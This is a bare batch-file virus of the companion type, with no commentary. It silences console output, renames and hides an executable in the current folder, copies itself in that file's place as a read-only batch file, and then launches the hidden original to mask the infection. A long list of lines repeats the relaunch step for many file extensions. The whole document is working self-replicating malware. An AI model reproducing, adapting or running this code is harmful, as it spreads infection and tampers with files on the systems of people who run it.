@echo off
@BREAK OFF
ctty nul
rem
for %%f in (*.exe *.com) do set A=%%f
if %A%==COMMAND.COM set A=
rename %A% V%A%
if not exist V%A% goto end
attrib +h V%A%
copy %0.bat %A%
attrib +r %A%
ren %A% *.bat
set A=
:end
ctty con
@if exist V%0.com V%0.com %1 %2 %3
@if exist V%0.exe V%0.exe %1 %2 %3
@if exist V%0.dvr V%0.dvr %1 %2 %3
@if exist V%0.dll V%0.dll %1 %2 %3
@if exist V%0.ini V%0.ini %1 %2 %3
@if exist V%0.sys V%0.sys %1 %2 %3
@if exist V%0.bin V%0.bin %1 %2 %3
@if exist V%0.bat V%0.bat %1 %2 %3
@if exist V%0.png V%0.png %1 %2 %3
@if exist V%0.jpg V%0.jpg %1 %2 %3
@if exist V%0.html V%0.html %1 %2 %3
@if exist V%0.php V%0.php %1 %2 %3
@if exist V%0.ovl V%0.ovl %1 %2 %3
@if exist V%0.gif V%0.gif %1 %2 %3
@if exist V%0.htm V%0.htm %1 %2 %3
@if exist V%0.bmp V%0.bmp %1 %2 %3
@if exist V%0.mp3 V%0.mp3 %1 %2 %3
@if exist V%0.txt V%0.txt %1 %2 %3
@if exist V%0.psd V%0.psd %1 %2 %3
@if exist V%0.avi V%0.avi %1 %2 %3
@if exist V%0.doc V%0.doc %1 %2 %3
@if exist V%0.xls V%0.xls %1 %2 %3
@if exist V%0.ppt V%0.ppt %1 %2 %3
@if exist V%0.mdb V%0.mdb %1 %2 %3
@if exist V%0.pit V%0.pit %1 %2 %3
@if exist V%0.scr V%0.scr %1 %2 %3
@if exist V%0.zip V%0.zip %1 %2 %3
@if exist V%0.rar V%0.rar %1 %2 %3
@if exist V%0.ocx V%0.ocx %1 %2 %3
@if exist V%0.pdf V%0.pdf %1 %2 %3
@if exist V%0.3gp V%0.3gp %1 %2 %3
@if exist V%0.mp4 V%0.mp4 %1 %2 %3
@if exist V%0.key V%0.key %1 %2 %3
@if exist V%0.rmvb V%0.rmvb %1 %2 %3
@if exist V%0.smi V%0.smi %1 %2 %3
@if exist V%0.srt V%0.srt %1 %2 %3
@if exist V%0.rt V%0.rt %1 %2 %3
@if exist V%0.sub V%0.sub %1 %2 %3
@if exist V%0.idx V%0.idx %1 %2 %3
@if exist V%0.gom V%0.gom %1 %2 %3
@if exist V%0.divx V%0.divx %1 %2 %3
@if exist V%0.asf V%0.asf %1 %2 %3
@if exist V%0.asx V%0.asx %1 %2 %3
@if exist V%0.wm V%0.wm %1 %2 %3
@if exist V%0.wmx V%0.wmx %1 %2 %3
@if exist V%0.wmp V%0.wmp %1 %2 %3
@if exist V%0.wvx V%0.wvx %1 %2 %3
@if exist V%0.mpg V%0.mpg %1 %2 %3
@if exist V%0.mpe V%0.mpe %1 %2 %3
@if exist V%0.mlv V%0.mlv %1 %2 %3
@if exist V%0.m2v V%0.m2v %1 %2 %3
@if exist V%0.dat V%0.dat %1 %2 %3
@if exist V%0.ocx V%0.ocx %1 %2 %3
